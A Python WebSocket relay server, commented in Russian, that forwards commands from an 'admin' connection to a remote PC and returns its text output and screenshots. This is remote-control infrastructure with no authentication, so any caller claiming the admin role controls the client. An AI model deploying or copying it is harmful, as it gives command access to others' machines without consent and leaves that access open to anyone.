import asyncio
import websockets
import os

# Хранилище активных подключений
connected_users = {}

async def handle_client(websocket, path=None):
    global connected_users
    try:
        # Первое сообщение от подключающегося определяет его роль
        role_message = await websocket.recv()
        
        if role_message == "ROLE:CLIENT":
            connected_users["client"] = websocket
            print("[+] Удаленный ПК (Клиент) успешно подключился к облаку!")
            if "admin" in connected_users:
                await connected_users["admin"].send("[+] Клиент в сети. Готов к работе.")
                
        elif role_message == "ROLE:ADMIN":
            connected_users["admin"] = websocket
            print("[+] Вы (Администратор) подключились к панели управления!")
            if "client" in connected_users:
                await websocket.send("[+] Клиент уже в сети. Можете отправлять команды.")
        else:
            await websocket.close()
            return

        # Цикл пересылки сообщений
        async for message in websocket:
            if websocket == connected_users.get("admin"):
                # Если команду прислал админ — шлем её клиенту
                if "client" in connected_users:
                    if isinstance(message, str):
                        await connected_users["client"].send(message)
                    else:
                        await connected_users["client"].send(message) # для байт-команд
                else:
                    await websocket.send("[-] Ошибка: Клиент сейчас не в сети.")
                    
            elif websocket == connected_users.get("client"):
                # Если ответ пришел от клиента — пересылаем его админу
                if "admin" in connected_users:
                    if isinstance(message, bytes):
                        await connected_users["admin"].send(message) # Пересылка байт скриншота
                    else:
                        await connected_users["admin"].send(message) # Пересылка текста

    except Exception as e:
        print(f"[-] Соединение разорвано: {e}")
    finally:
        # Очистка при отключении
        if connected_users.get("client") == websocket:
            connected_users.pop("client", None)
            print("[-] Клиент отключился.")
            if "admin" in connected_users:
                await connected_users["admin"].send("[-] Клиент отключился от облака.")
        if connected_users.get("admin") == websocket:
            connected_users.pop("admin", None)
            print("[-] Администратор отключился.")

port = int(os.environ.get("PORT", 10000))

async def main():
    async with websockets.serve(handle_server_logic, "0.0.0.0", port, max_size=10*1024*1024): # Лимит 10МБ для фото
        await asyncio.Future()

async def handle_server_logic(websocket, path=None):
    await handle_client(websocket, path)

if __name__ == "__main__":
    asyncio.run(main())

if __name__ == "__main__":
    asyncio.run(main())
